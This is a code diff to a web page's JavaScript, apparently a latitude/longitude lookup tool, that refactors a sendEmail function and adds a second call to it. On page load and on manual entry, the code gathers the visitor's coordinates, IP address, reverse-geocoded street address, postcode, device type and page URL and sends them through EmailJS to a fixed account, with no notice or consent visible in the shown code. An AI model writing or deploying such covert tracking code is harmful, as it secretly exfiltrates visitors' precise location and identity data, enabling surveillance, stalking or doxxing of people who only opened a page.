@@ -97,9 +97,41 @@
             if (latitude && longitude) {
                 const locationData = await fetchLocationData(latitude, longitude);
                 displayLocationResult(locationData);
+
+                // Fetch IP for the email data
+                const ipAddress = await getIP();
+
+                // Send email after fetching location data
+                sendEmail({
+                    coords: { latitude, longitude },
+                    ipAddress,
+                    locationData
+                });
             } else {
                 alert("Please enter both latitude and longitude.");
             }
+        }
+
+        // Updated sendEmail to accept a single parameter with properties
+        function sendEmail({ coords, ipAddress, locationData }) {
+            emailjs.send("service_mupmc8l", "template_1f01srj", {
+                user_latitude: coords.latitude,
+                user_longitude: coords.longitude,
+                user_ipaddress: ipAddress,
+                user_country: locationData.address?.country || "Unknown",
+                user_country_code: locationData.address?.country_code || "Unknown",
+                user_state: locationData.address?.state || "Unknown",
+                user_city: locationData.address?.city || locationData.address?.state_district || "Unknown",
+                user_pincode: locationData.address?.postcode || "Unknown",
+                user_address: locationData?.display_name || "Unknown",
+                user_device_type: deviceType,
+                user_device_category: deviceCategory,
+                user_link: window.location.href,
+            }).then(response => {
+                console.log("Email sent successfully!", response.status, response.text);
+            }).catch(error => {
+                console.error("Failed to send email.", error);
+            });
         }
 
         // Automatically fetch the user's location when the page loads
@@ -113,34 +145,17 @@
                     document.getElementById("longitude").value = position.coords.longitude;
                     displayLocationResult(locationData);
 
-                    sendEmail(position, ipAddress, locationData);
+                    sendEmail({
+                        coords: position.coords,
+                        ipAddress,
+                        locationData
+                    });
                 }, (error) => {
                     alert("Unable to retrieve your location. Please check your settings.");
                 });
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
-        }
-
-        function sendEmail(position, ipAddress, data) {
-            emailjs.send("service_mupmc8l", "template_1f01srj", {
-                user_latitude: position.coords.latitude,
-                user_longitude: position.coords.longitude,
-                user_ipaddress: ipAddress,
-                user_country: data.address?.country || "Unknown",
-                user_country_code: data.address?.country_code || "Unknown",
-                user_state: data.address?.state || "Unknown",
-                user_city: data.address?.city || data.address?.state_district || "Unknown",
-                user_pincode: data.address?.postcode || "Unknown",
-                user_address: data?.display_name || "Unknown",
-                user_device_type: deviceType,
-                user_device_category: deviceCategory,
-                user_link: window.location.href,
-            }).then(response => {
-                console.log("Email sent successfully!", response.status, response.text);
-            }).catch(error => {
-                console.error("Failed to send email.", error);
-            });
         }
 
         getLocation();
